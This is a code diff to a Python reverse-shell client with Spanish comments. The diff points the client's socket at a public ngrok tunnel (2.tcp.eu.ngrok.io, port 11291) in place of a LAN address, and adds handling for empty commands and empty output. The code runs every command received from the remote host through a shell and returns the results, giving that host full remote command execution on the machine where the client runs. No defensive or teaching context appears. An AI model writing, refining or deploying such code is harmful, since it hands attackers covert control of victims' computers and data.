@@ -3,13 +3,14 @@ import subprocess
 import os
 
 def main():
-    host = '192.168.1.138'  # Cambia esto por la dirección IP del servidor
-    port = 12345  # Puerto en el que el servidor está escuchando
+    host = '2.tcp.eu.ngrok.io'  # Cambia esto por la dirección IP del servidor
+    port = 11291  # Puerto en el que el servidor está escuchando
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((host, port))
         while True:
             command = s.recv(1024).decode()
+            #print(command)
             if command.lower() == 'exit':
                 break
             elif command.startswith('cd '):
@@ -19,9 +20,13 @@ def main():
                     output = f"Cambiado al directorio: {os.getcwd()}"
                 except Exception as e:
                     output = str(e)
+            elif not command or command =="":
+                output = "No encuentro comando"
             else:
                 try:
                     output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                    if not output:
+                        output = "Void"
                 except Exception as e:
                     output = str(e).encode()
             if isinstance(output, bytes):
